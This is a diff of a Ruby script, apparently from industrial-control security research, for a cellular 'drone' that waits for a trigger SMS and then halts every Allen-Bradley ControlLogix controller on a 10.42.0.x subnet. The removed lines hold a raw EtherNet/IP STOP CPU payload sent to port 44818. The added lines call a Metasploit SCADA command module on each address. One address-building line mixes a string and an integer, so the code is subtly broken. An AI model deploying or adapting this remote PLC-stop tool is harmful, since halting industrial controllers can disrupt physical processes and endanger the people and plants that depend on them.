@@ -1,12 +1,12 @@
 ##########################################################
 #
 #	Author: Stephen J. Hilt
-#		hilt@digitalbond.com
+#			hilt@digitalbond.com
 #
 #
 #	This Will listen on the drone cell for a Text Message
 #	Once specified Message is received, it will then send
-#   	Stop CPU command on the given network. 
+#   Stop CPU command on the given network. 
 #
 #
 #########################################################
@@ -16,12 +16,6 @@ require "wiringpi"
 require "socket"
 
 def recv_txt(sp) 
-	#AllenBradley ControlLogix STOP CPU Command
-	payload =  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + #encapsulation -[payload.size-0x10]-
-      "\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x1a\x00" + #packet1
-      "\x52\x02\x20\x06\x24\x01\x03\xf0\x0c\x00\x07\x02\x20\x64\x24\x01" + #packet2
-      "\xDE\xAD\xBE\xEF\xCA\xFE\x01\x00\x01\x00"
-	
 	
 	# Setup to Read Text
 	sp.puts"AT+CMGF=1"
@@ -49,12 +43,8 @@ def recv_txt(sp)
 				while (count < 255) do
 					# Setup IP Address
 					ipaddr = '10.42.0.' + count 
-					# open new socket to ipaddr on EthernetIP port
-					sock = TCPSocket.new(ipaddr, 44818)
-					# Write the STOP CPU command to the socket
-					sock.write payload
-					# Close socket
-					sock.close
+					# run metasploit module for each command
+					ret_val = system( "msfcli auxiliary/admin/scada/multi_cip_command RHOST=" + ipaddr + " E" )
 					# Increment Counter
 					count = count + 1
 				end
